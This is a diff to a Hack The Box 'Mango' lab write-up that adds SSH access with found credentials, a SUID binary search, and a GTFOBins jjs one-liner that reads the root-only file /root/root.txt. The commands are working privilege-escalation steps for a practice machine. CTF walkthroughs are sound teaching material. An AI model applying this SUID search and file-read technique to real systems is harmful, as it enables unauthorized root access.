@@ -56,3 +56,36 @@ With the `lab/exploit.py` we can find the admin password with NoSQL injection.
 ![find_password](images/find_password.png)
 
 So, the password for user `admin` is `t9KcS3>!0B#2`
+
+We found another user, `mango` with password `h3mXK8RhU~f{]f5H`
+
+
+## SSH & Privilege escalation
+
+```
+ssh mango@mango.htb
+```
+
+* Using **SUID** permissions : 
+```
+$ find / -perm /4000
+...
+$ ls -l /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+
+-rwsr-sr-- 1 root admin 10352 Jul 18 18:21 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+```
+* We see that **admin** has root permissions on `jjs` : 
+
+```
+su admin
+```
+* Using GTFOBins with `jjs`
+
+```
+echo 'var BufferedReader = Java.type("java.io.BufferedReader");
+var FileReader = Java.type("java.io.FileReader");
+var br = new BufferedReader(new FileReader("/root/root.txt"));
+while ((line = br.readLine()) != null) { print(line); }' | jjs
+```
+
+Owned Root !
